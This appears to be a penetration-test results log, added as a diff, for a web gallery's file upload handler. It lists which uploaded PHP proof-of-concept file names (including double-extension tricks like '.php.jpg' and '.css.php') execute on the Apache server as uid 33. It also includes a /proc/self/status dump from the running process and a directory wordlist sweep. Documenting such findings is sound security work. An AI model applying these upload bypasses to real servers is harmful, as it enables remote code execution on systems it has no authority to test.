@@ -1,0 +1,40 @@
+### Upload name matrix (payload = PHP that prints POSIXUID/SAPI and /proc/self/status)
+### every fetch is anonymous with NO cookie jar
+poc3.php         up=Archivo subido exitosamente:   GET=200 EXECUTED: POSIXUID=33 POSIXEUID=33 SAPI=apache2handler 
+poc3.php.jpg     up=Archivo subido exitosamente:   GET=200 EXECUTED: POSIXUID=33 POSIXEUID=33 SAPI=apache2handler 
+poc3.php5        up=Archivo subido exitosamente:   GET=200 EXECUTED: POSIXUID=33 POSIXEUID=33 SAPI=apache2handler 
+poc3.jpg         up=Archivo subido exitosamente:   GET=200 SERVED-VERBATIM (690B)
+poc3.txt         up=Archivo subido exitosamente:   GET=200 SERVED-VERBATIM (690B)
+poc3.css         up=Archivo subido exitosamente:   GET=200 SERVED-VERBATIM (690B)
+poc3.phtml       up=Archivo subido exitosamente:   GET=200 EXECUTED: POSIXUID=33 POSIXEUID=33 SAPI=apache2handler 
+poc3.phps        up=Archivo subido exitosamente:   GET=403 EXECUTED: 
+poc3.css.php     up=Archivo subido exitosamente:   GET=200 EXECUTED: POSIXUID=33 POSIXEUID=33 SAPI=apache2handler 
+
+### /proc/self/status from inside the executing process (poc3.php.jpg)
+PROC|Uid:	33	33	33	33
+PROC|Gid:	33	33	33	33
+PROC|Groups:	33 
+PROC|CapEff:	0000000000000000
+PROC|CapBnd:	00000000a80425fb
+PROC|NoNewPrivs:	0
+PROC|Seccomp:	2
+POSIXUID=33 POSIXEUID=33
+SAPI=apache2handler
+SCRIPT=/var/www/html/gallery/uploads/images/poc3.php.jpg
+ST_OWNER=33
+ST_MODE=644
+
+### impossible-name control for the fuzz sweep
+404 272
+
+### wordlist sweep (69 names x 2 prefixes = 138 requests)
+CONTROL /zzq7x9f2a-nonexistent-control-8f2a91/deep.html -> (404, 'text/html; charset=iso-8859-1', 272, 'c9ed091c5471')
+
+  /.htaccess                                         (403, 'text/html; charset=iso-8859-1', 275, '22ef8c435b79')
+  /gallery/uploads/.htaccess                         (403, 'text/html; charset=iso-8859-1', 275, '22ef8c435b79')
+  /gallery/uploads/handler.php                       (200, 'text/html; charset=UTF-8', 148, 'b2df19900435')
+  /gallery/uploads/images                            (200, 'text/html;charset=UTF-8', 12657, 'cf2ad727ba83')
+  /index.html                                        (200, 'text/html', 1772, '3031edcf0842')
+  /server-status                                     (403, 'text/html; charset=iso-8859-1', 275, '22ef8c435b79')
+
+tested=138 candidates=69 deviations_from_control=6
